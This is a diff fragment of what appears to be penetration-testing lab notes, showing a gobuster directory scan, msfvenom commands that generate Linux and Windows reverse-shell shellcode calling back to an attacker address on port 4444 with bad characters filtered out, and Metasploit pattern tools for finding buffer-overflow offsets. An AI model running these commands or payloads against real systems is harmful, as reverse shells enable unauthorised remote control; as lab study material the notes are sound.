@@ -22,10 +22,14 @@ gobuster dir -u http://192.168.174.101/ -w /usr/share/wordlists/dirbuster/direct
 --
 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.136 LPORT=4444 -b "\x00\x0a\x0d\x20\x37" -o exploit.txt
+
 sfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.136 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
+
 msfvenom -p windows/exec CMD="cmd.exe" -b '\x00\x0a\x1a' -f c
 
+
 msf-pattern_create -l 5000 > exploit.txt
+
 msf-pattern_offset -q 413461A2 -l 5000
 
 
